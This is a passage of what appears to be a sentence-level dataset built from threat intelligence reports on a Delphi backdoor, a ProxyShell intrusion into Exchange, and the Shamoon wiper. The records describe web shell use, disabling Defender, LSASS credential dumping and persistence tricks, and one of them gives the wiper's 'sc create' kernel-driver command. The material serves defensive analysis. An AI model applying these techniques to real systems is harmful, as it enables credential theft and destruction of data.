        "id": "cti_reports_filtered/r-916.md:::S42",
        "text": "This command can be used when the operators are aware of the presence of interesting files on the computer.\n",
        "type": "",
        "report": "r-916",
        "line": 42,
        "index": 2524
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S43",
        "text": "Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor.",
        "type": "",
        "report": "r-916",
        "line": 43,
        "index": 2525
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S44",
        "text": "This backdoor is executed using the CMD_EXECUTE command:\n",
        "type": "",
        "report": "r-916",
        "line": 44,
        "index": 2526
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S45",
        "text": "There are some interesting facts here.",
        "type": "",
        "report": "r-916",
        "line": 45,
        "index": 2527
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S46",
        "text": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "type": "",
        "report": "r-916",
        "line": 46,
        "index": 2528
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S47",
        "text": "Second, the hex-encoded string is the C&C used by the custom backdoor while in the Delphi backdoor the C&C is embedded in the configuration.",
        "type": "",
        "report": "r-916",
        "line": 47,
        "index": 2529
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S48",
        "text": "The two Delphi backdoors, the common one and the one above, are quite similar but contain these interesting tweaks:\n",
        "type": "",
        "report": "r-916",
        "line": 48,
        "index": 2530
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S49",
        "text": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "type": "",
        "report": "r-916",
        "line": 49,
        "index": 2531
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S50",
        "text": "The detection ratio is definitely lower in comparison to the \u201cusual\u201d backdoor.",
        "type": "",
        "report": "r-916",
        "line": 50,
        "index": 2532
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S51",
        "text": "The very short timeframe where this backdoor is on the system and operating makes it harder to retrieve.",
        "type": "",
        "report": "r-916",
        "line": 51,
        "index": 2533
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S52",
        "text": "Once its operators complete their evil deeds, they quickly remove it.",
        "type": "",
        "report": "r-916",
        "line": 52,
        "index": 2534
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S0",
        "text": "The threat actors activity occurred in two bursts within a 3 day time frame.",
        "type": "",
        "report": "r-932",
        "line": 0,
        "index": 2535
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S1",
        "text": "As with our previous case, they started by uploading their web shell and disabling antivirus services.\n",
        "type": "",
        "report": "r-932",
        "line": 1,
        "index": 2536
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S2",
        "text": "Soon after, they established two persistence methods.",
        "type": "",
        "report": "r-932",
        "line": 2,
        "index": 2537
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S3",
        "text": "The first was through scheduled tasks, and the second, was via a newly created account.",
        "type": "",
        "report": "r-932",
        "line": 3,
        "index": 2538
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S4",
        "text": "The account was then added to the \u201cremote desktop users\u201d and \u201clocal administrators users\u201d groups.",
        "type": "",
        "report": "r-932",
        "line": 4,
        "index": 2539
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S5",
        "text": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "type": "",
        "report": "r-932",
        "line": 5,
        "index": 2540
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S6",
        "text": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "type": "",
        "report": "r-932",
        "line": 6,
        "index": 2541
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S7",
        "text": "At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.\n",
        "type": "",
        "report": "r-932",
        "line": 7,
        "index": 2542
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S8",
        "text": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "type": "",
        "report": "r-932",
        "line": 8,
        "index": 2543
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S9",
        "text": "The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.",
        "type": "",
        "report": "r-932",
        "line": 9,
        "index": 2544
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S10",
        "text": "Two days later, we saw the threat actors reappear.",
        "type": "",
        "report": "r-932",
        "line": 10,
        "index": 2545
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S11",
        "text": "We expected them to pick up where they left off, however, they repeated all previous actions.",
        "type": "",
        "report": "r-932",
        "line": 11,
        "index": 2546
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S12",
        "text": "Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.",
        "type": "",
        "report": "r-932",
        "line": 12,
        "index": 2547
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S13",
        "text": "No further activity was observed as the threat actors were evicted from the network.\n",
        "type": "",
        "report": "r-932",
        "line": 13,
        "index": 2548
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S14",
        "text": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:\n",
        "type": "",
        "report": "r-932",
        "line": 14,
        "index": 2549
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S15",
        "text": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.\n",
        "type": "",
        "report": "r-932",
        "line": 15,
        "index": 2550
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S16",
        "text": "Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:\n",
        "type": "",
        "report": "r-932",
        "line": 16,
        "index": 2551
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S17",
        "text": "The threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension.",
        "type": "",
        "report": "r-932",
        "line": 17,
        "index": 2552
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S18",
        "text": "While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.",
        "type": "",
        "report": "r-932",
        "line": 18,
        "index": 2553
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S19",
        "text": "In an attempt to hide the actions taken, the actor removes the request just created:\n",
        "type": "",
        "report": "r-932",
        "line": 19,
        "index": 2554
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S20",
        "text": "This activity then repeated approximately 2 days after the initial exploitation.",
        "type": "",
        "report": "r-932",
        "line": 20,
        "index": 2555
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S21",
        "text": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "type": "",
        "report": "r-932",
        "line": 21,
        "index": 2556
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S22",
        "text": "Below is the second web shell created that shares the same naming convention as the first.",
        "type": "",
        "report": "r-932",
        "line": 22,
        "index": 2557
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S23",
        "text": "Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.\n",
        "type": "",
        "report": "r-932",
        "line": 23,
        "index": 2558
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S24",
        "text": "The web shell followed a similar structure seen in previous cases.",
        "type": "",
        "report": "r-932",
        "line": 24,
        "index": 2559
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S25",
        "text": "At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran.",
        "type": "",
        "report": "r-932",
        "line": 25,
        "index": 2560
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S26",
        "text": "The web shell had predefined functions for special actions:\n",
        "type": "",
        "report": "r-932",
        "line": 26,
        "index": 2561
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S27",
        "text": "- get \u2013 Get file from location on disk (additional dst POST parameter)\n",
        "type": "",
        "report": "r-932",
        "line": 27,
        "index": 2562
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S28",
        "text": "- put \u2013 Upload file to location (additional dst POST parameter)\n",
        "type": "",
        "report": "r-932",
        "line": 28,
        "index": 2563
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S29",
        "text": "- run \u2013 Execute a list of commands separated by \u201c;\u201d using PowerShell.\n",
        "type": "",
        "report": "r-932",
        "line": 29,
        "index": 2564
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S30",
        "text": "If exec_code does not start with one of the above commands, it will simply attempt to run it with PowerShell.\n",
        "type": "",
        "report": "r-932",
        "line": 30,
        "index": 2565
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S31",
        "text": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "type": "",
        "report": "r-932",
        "line": 31,
        "index": 2566
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S32",
        "text": "Below you can see an example of commands that were sent and the outputs they returned in the response.",
        "type": "",
        "report": "r-932",
        "line": 32,
        "index": 2567
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S33",
        "text": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "type": "",
        "report": "r-932",
        "line": 33,
        "index": 2568
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S34",
        "text": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.\n",
        "type": "",
        "report": "r-932",
        "line": 34,
        "index": 2569
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S35",
        "text": "Scheduled Task Commands:\n",
        "type": "",
        "report": "r-932",
        "line": 35,
        "index": 2570
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S36",
        "text": "Defender Modification Command: \n",
        "type": "",
        "report": "r-932",
        "line": 36,
        "index": 2571
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S37",
        "text": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "type": "",
        "report": "r-932",
        "line": 37,
        "index": 2572
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S38",
        "text": "Wininet.bat simply loops through the execution of the file dllhost.exe .\n",
        "type": "",
        "report": "r-932",
        "line": 38,
        "index": 2573
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S39",
        "text": "The file dllhost.exe is a golang binary.",
        "type": "",
        "report": "r-932",
        "line": 39,
        "index": 2574
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S40",
        "text": "When executed, the binary was observed resolving the following domains:\n",
        "type": "",
        "report": "r-932",
        "line": 40,
        "index": 2575
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S41",
        "text": "The binary also spawns the following commands when executed:\n",
        "type": "",
        "report": "r-932",
        "line": 41,
        "index": 2576
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S42",
        "text": "The binary has a low confidence reference to FRP (FastReverseProxy) as the sample matches the closed source Yara rule \u2013 HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by Florian Roth) however it does not behave in the same way as the open source tool.",
        "type": "",
        "report": "r-932",
        "line": 42,
        "index": 2577
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S43",
        "text": "This file also matches on an additional Yara rule more recently \u2013 APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.",
        "type": "",
        "report": "r-932",
        "line": 43,
        "index": 2578
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S44",
        "text": "The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.\n",
        "type": "",
        "report": "r-932",
        "line": 44,
        "index": 2579
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S45",
        "text": "During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:\n",
        "type": "",
        "report": "r-932",
        "line": 45,
        "index": 2580
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S46",
        "text": "The first thing they did was make a new user named DefaultAccount with the password [email protected] .",
        "type": "",
        "report": "r-932",
        "line": 46,
        "index": 2581
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S47",
        "text": "They then activated the account and changed the password ( [email protected] ) for the second time.",
        "type": "",
        "report": "r-932",
        "line": 47,
        "index": 2582
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S48",
        "text": "Finally the commands added the new account to the Administrators group and Remote Desktop Users group.\n",
        "type": "",
        "report": "r-932",
        "line": 48,
        "index": 2583
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S49",
        "text": "The threat actors ran the same command again two days later:\n",
        "type": "",
        "report": "r-932",
        "line": 49,
        "index": 2584
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S50",
        "text": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.\n",
        "type": "",
        "report": "r-932",
        "line": 50,
        "index": 2585
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S51",
        "text": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "type": "",
        "report": "r-932",
        "line": 51,
        "index": 2586
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S52",
        "text": "Below, we can observe the content of wininet.xml: \n",
        "type": "",
        "report": "r-932",
        "line": 52,
        "index": 2587
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S53",
        "text": "The following commands where then ran to initiate the task and to achieve persistence:\n",
        "type": "",
        "report": "r-932",
        "line": 53,
        "index": 2588
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S54",
        "text": "The scheduled task created by the web shell was set to use the principal SID \u201cS-1-5-18\u201d, or SYSTEM.\n",
        "type": "",
        "report": "r-932",
        "line": 54,
        "index": 2589
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S55",
        "text": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:\n",
        "type": "",
        "report": "r-932",
        "line": 55,
        "index": 2590
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S56",
        "text": "Windows Defender Behavior Monitoring was disabled.\n",
        "type": "",
        "report": "r-932",
        "line": 56,
        "index": 2591
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S57",
        "text": "The Severe Threat default action was set to \u2018Allow\u2019.\n",
        "type": "",
        "report": "r-932",
        "line": 57,
        "index": 2592
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S58",
        "text": "Realtime Monitoring was disabled.",
        "type": "",
        "report": "r-932",
        "line": 58,
        "index": 2593
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S59",
        "text": "The \u2018C:\\Windows\u2019 path was excluded from scheduled and real-time scanning.\n",
        "type": "",
        "report": "r-932",
        "line": 59,
        "index": 2594
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S60",
        "text": "A rule was added to the Windows Firewall to allow remote RDP traffic.\n",
        "type": "",
        "report": "r-932",
        "line": 60,
        "index": 2595
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S61",
        "text": "Remote Desktop Services was started.\n",
        "type": "",
        "report": "r-932",
        "line": 61,
        "index": 2596
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S62",
        "text": "The threat actor enabled WDigest authentication.",
        "type": "",
        "report": "r-932",
        "line": 62,
        "index": 2597
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S63",
        "text": "This enforces the storage of credentials in plaintext on future logins.\n",
        "type": "",
        "report": "r-932",
        "line": 63,
        "index": 2598
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S64",
        "text": "LSA protection was disabled.\n",
        "type": "",
        "report": "r-932",
        "line": 64,
        "index": 2599
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S65",
        "text": "The threat actor created a process memory dump from LSASS.exe.",
        "type": "",
        "report": "r-932",
        "line": 65,
        "index": 2600
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S66",
        "text": "In this case they created a \u201cminidump\u201d using the LOLBIN comsvcs.dll.",
        "type": "",
        "report": "r-932",
        "line": 66,
        "index": 2601
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S67",
        "text": "This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.\n",
        "type": "",
        "report": "r-932",
        "line": 67,
        "index": 2602
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S68",
        "text": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "type": "",
        "report": "r-932",
        "line": 68,
        "index": 2603
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S69",
        "text": "They executed commands such as:\n",
        "type": "",
        "report": "r-932",
        "line": 69,
        "index": 2604
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S70",
        "text": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.\n",
        "type": "",
        "report": "r-932",
        "line": 70,
        "index": 2605
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S71",
        "text": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.\n",
        "type": "",
        "report": "r-932",
        "line": 71,
        "index": 2606
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S72",
        "text": "Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command.",
        "type": "",
        "report": "r-932",
        "line": 72,
        "index": 2607
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S73",
        "text": "This was likely done as a test.\n",
        "type": "",
        "report": "r-932",
        "line": 73,
        "index": 2608
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S74",
        "text": "While having access to the Exchange server, we observed no attempts to export or access user mailboxes.\n",
        "type": "",
        "report": "r-932",
        "line": 74,
        "index": 2609
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S75",
        "text": "As we saw from the execution section, dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.\n",
        "type": "",
        "report": "r-932",
        "line": 75,
        "index": 2610
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S76",
        "text": "This C2 channel was not used very much as most activity was done through the web shell.\n",
        "type": "",
        "report": "r-932",
        "line": 76,
        "index": 2611
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S77",
        "text": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.\n",
        "type": "",
        "report": "r-932",
        "line": 77,
        "index": 2612
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S78",
        "text": "Here you can see the threat actor using the web shell command to extract it:\n",
        "type": "",
        "report": "r-932",
        "line": 78,
        "index": 2613
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S79",
        "text": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "type": "",
        "report": "r-932",
        "line": 79,
        "index": 2614
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S80",
        "text": "Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.\n",
        "type": "",
        "report": "r-932",
        "line": 80,
        "index": 2615
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S0",
        "text": "Shamoon is a dropper that carries three resources.",
        "type": "",
        "report": "r-961",
        "line": 0,
        "index": 2616
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S1",
        "text": "The dropper is responsible for collecting data as well as embedding evasion techniques such as obfuscation, antidebugging, or antiforensic tricks.",
        "type": "",
        "report": "r-961",
        "line": 1,
        "index": 2617
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S2",
        "text": "The dropper requires an argument to run.",
        "type": "",
        "report": "r-961",
        "line": 2,
        "index": 2618
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S3",
        "text": "It decrypts the three resources and installs them on the system in the %System% folder.",
        "type": "",
        "report": "r-961",
        "line": 3,
        "index": 2619
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S4",
        "text": "It also creates the service MaintenaceSrv, which runs the wiper.",
        "type": "",
        "report": "r-961",
        "line": 4,
        "index": 2620
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S5",
        "text": "The typo in the service name eases detection.\n",
        "type": "",
        "report": "r-961",
        "line": 5,
        "index": 2621
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S6",
        "text": "The Advanced Threat Research team has watched this service evolve over the years.",
        "type": "",
        "report": "r-961",
        "line": 6,
        "index": 2622
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S7",
        "text": "The following tables highlight the differences:\n",
        "type": "",
        "report": "r-961",
        "line": 7,
        "index": 2623
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S8",
        "text": "The wiper uses ElRawDisk.sys to access the user\u2019s raw disk and overwrites all data in all folders and disk sectors, causing a critical state of the infected machine before it finally reboots.\n",
        "type": "",
        "report": "r-961",
        "line": 8,
        "index": 2624
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S9",
        "text": "The result is either a blue screen or driver error that renders the machine unusable.\n",
        "type": "",
        "report": "r-961",
        "line": 9,
        "index": 2625
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S10",
        "text": "The dropper contains other malicious components masked as encrypted files embedded in PE section.\n",
        "type": "",
        "report": "r-961",
        "line": 10,
        "index": 2626
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S11",
        "text": "These resources are decrypted by the dropper and contain:\n",
        "type": "",
        "report": "r-961",
        "line": 11,
        "index": 2627
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S12",
        "text": "- MNU: The communication module\n",
        "type": "",
        "report": "r-961",
        "line": 12,
        "index": 2628
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S13",
        "text": "- LNG: The wiper component\n",
        "type": "",
        "report": "r-961",
        "line": 13,
        "index": 2629
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S14",
        "text": "- PIC: The 64-bit version of the dropper\n",
        "type": "",
        "report": "r-961",
        "line": 14,
        "index": 2630
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S15",
        "text": "Shamoon 2018 needs an argument to run and infect machines.",
        "type": "",
        "report": "r-961",
        "line": 15,
        "index": 2631
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S16",
        "text": "It decrypts several strings in memory that gather information on the system and determine whether to drop the 32-bit or 64-bit version.\n",
        "type": "",
        "report": "r-961",
        "line": 16,
        "index": 2632
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S17",
        "text": "It also drops the file key8854321.pub (MD5: 41f8cd9ac3fb6b1771177e5770537518) in the folder c:\\Windows\\Temp\\key8854321.pub.\n",
        "type": "",
        "report": "r-961",
        "line": 17,
        "index": 2633
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S18",
        "text": "The malware decrypts two files used later:\n",
        "type": "",
        "report": "r-961",
        "line": 18,
        "index": 2634
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S19",
        "text": "Shamoon enables the service RemoteRegistry, which allows a program to remotely modify the registry.",
        "type": "",
        "report": "r-961",
        "line": 19,
        "index": 2635
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S20",
        "text": "It also disables remote user account control by enabling the registry key LocalAccountTokenFilterPolicy.\n",
        "type": "",
        "report": "r-961",
        "line": 20,
        "index": 2636
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S21",
        "text": "The malware checks whether the following shares exist to copy itself and spread:\n",
        "type": "",
        "report": "r-961",
        "line": 21,
        "index": 2637
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S22",
        "text": "Shamoon queries the service to retrieve specific information related to the LocalService account.",
        "type": "",
        "report": "r-961",
        "line": 22,
        "index": 2638
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S23",
        "text": "It then retrieves the resources within the PE file to drop the components.",
        "type": "",
        "report": "r-961",
        "line": 23,
        "index": 2639
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S24",
        "text": "Finding the location of the resource:\n",
        "type": "",
        "report": "r-961",
        "line": 24,
        "index": 2640
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S25",
        "text": "Shamoon creates the file and sets the time to August 2012 as an antiforensic trick.",
        "type": "",
        "report": "r-961",
        "line": 25,
        "index": 2641
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S26",
        "text": "It puts this date on any file it can destroy.\n",
        "type": "",
        "report": "r-961",
        "line": 26,
        "index": 2642
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S27",
        "text": "The modification time can be used as an antiforensic trick to bypass detection based on the timeline, for example.",
        "type": "",
        "report": "r-961",
        "line": 27,
        "index": 2643
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S28",
        "text": "We also observed that in some cases the date is briefly modified on the system, faking the date of each file.",
        "type": "",
        "report": "r-961",
        "line": 28,
        "index": 2644
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S29",
        "text": "The files dropped on the system are stored in C:\\\\Windows\\System32\\.\n",
        "type": "",
        "report": "r-961",
        "line": 29,
        "index": 2645
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S30",
        "text": "Before creating the malicious service, Shamoon elevates its privilege by impersonating the token.",
        "type": "",
        "report": "r-961",
        "line": 30,
        "index": 2646
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S31",
        "text": "It first uses LogonUser and ImpersonateLoggedOnUser, then ImpersonateNamedPipeClient.",
        "type": "",
        "report": "r-961",
        "line": 31,
        "index": 2647
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S32",
        "text": "Metasploit uses a similar technique to elevate privileges.",
        "type": "",
        "report": "r-961",
        "line": 32,
        "index": 2648
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S33",
        "text": "Elevating privileges is critical for malware to perform additional system modifications, which are usually restricted.\n",
        "type": "",
        "report": "r-961",
        "line": 33,
        "index": 2649
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S34",
        "text": "Shamoon creates the new malicious service MaintenaceSrv.",
        "type": "",
        "report": "r-961",
        "line": 34,
        "index": 2650
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S35",
        "text": "It creates the service with the option Autostart (StartType: 2) and runs the service with its own process (ServiceType: 0x10):\n",
        "type": "",
        "report": "r-961",
        "line": 35,
        "index": 2651
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S36",
        "text": "If the service is already created, it changes the configuration parameter of the service with the previous configuration.\n",
        "type": "",
        "report": "r-961",
        "line": 36,
        "index": 2652
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S37",
        "text": "It finally finishes creating MaintenaceSrv:\n",
        "type": "",
        "report": "r-961",
        "line": 37,
        "index": 2653
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S38",
        "text": "The wiper dropped on the system can have any one of the following names:\n",
        "type": "",
        "report": "r-961",
        "line": 38,
        "index": 2654
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S39",
        "text": "Next the wiper runs to destroy the data.\n",
        "type": "",
        "report": "r-961",
        "line": 39,
        "index": 2655
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S40",
        "text": "The wiper component is dropped into the System32 folder.",
        "type": "",
        "report": "r-961",
        "line": 40,
        "index": 2656
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S41",
        "text": "It takes one parameter to run.",
        "type": "",
        "report": "r-961",
        "line": 41,
        "index": 2657
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S42",
        "text": "The wiper driver is embedded in its resources.\n",
        "type": "",
        "report": "r-961",
        "line": 42,
        "index": 2658
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S43",
        "text": "We can see the encrypted resources, 101, in this screenshot:\n",
        "type": "",
        "report": "r-961",
        "line": 43,
        "index": 2659
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S44",
        "text": "The resource decrypted is the driver ElRawDisk.sys, which wipes the disk.",
        "type": "",
        "report": "r-961",
        "line": 44,
        "index": 2660
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S45",
        "text": "Extracting the resource:\n",
        "type": "",
        "report": "r-961",
        "line": 45,
        "index": 2661
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S46",
        "text": "This preceding file is not malicious but is considered risky because it is the original driver.\n",
        "type": "",
        "report": "r-961",
        "line": 46,
        "index": 2662
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S47",
        "text": "The wiper creates a service to run the driver with the following command:\n",
        "type": "",
        "report": "r-961",
        "line": 47,
        "index": 2663
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S48",
        "text": "sc create hdv_725x type= kernel start= demand binpath= WINDOWS\\hdv_725x.sys 2>&1 >nul\n",
        "type": "",
        "report": "r-961",
        "line": 48,
        "index": 2664
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S49",
        "text": "The following screenshot shows the execution of this command:\n",
        "type": "",
        "report": "r-961",
        "line": 49,
        "index": 2665
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S50",
        "text": "The malware overwrites every file in c:\\Windows\\System32, placing the machine in a critical state.",
        "type": "",
        "report": "r-961",
        "line": 50,
        "index": 2666
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S51",
        "text": "All the files on the system are overwritten.\n",
        "type": "",
        "report": "r-961",
        "line": 51,
        "index": 2667
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S52",
        "text": "The overwriting process:\n",
        "type": "",
        "report": "r-961",
        "line": 52,
        "index": 2668
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S53",
        "text": "Finally, it forces the reboot with the following command:\n",
        "type": "",
        "report": "r-961",
        "line": 53,
        "index": 2669
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S54",
